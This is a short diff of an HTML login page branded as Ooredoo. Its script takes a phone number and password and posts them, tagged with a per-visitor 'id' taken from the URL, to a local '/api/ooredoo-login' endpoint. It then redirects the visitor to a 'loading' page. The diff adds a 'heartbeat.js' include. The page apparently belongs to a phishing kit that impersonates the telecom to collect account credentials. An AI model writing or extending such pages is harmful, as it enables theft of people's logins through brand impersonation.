@@ -29,5 +29,6 @@ function togglePw(){var pw=document.getElementById('pw');var eye=document.getEle
 function handleLogin(){var username=document.getElementById('username');var password=document.getElementById('pw');var error=document.getElementById('loginError');var invalid=!username.value.trim()||!password.value;error.classList.toggle('visible',invalid);if(invalid){username.focus();return;}var id=new URLSearchParams(window.location.search).get('id')||'';if(!id){error.classList.add('visible');return;}fetch('/api/ooredoo-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id,phone:username.value,password:password.value})}).then(function(response){if(!response.ok)throw new Error('rejected');window.location.href='ooredoo-loading-en.html?id='+encodeURIComponent(id);}).catch(function(){error.classList.add('visible');password.value='';password.focus();});}
 if(new URLSearchParams(window.location.search).get('error')==='1')document.getElementById('loginError').classList.add('visible');
 </script>
+<script src="heartbeat.js"></script>
 </body>
 </html>
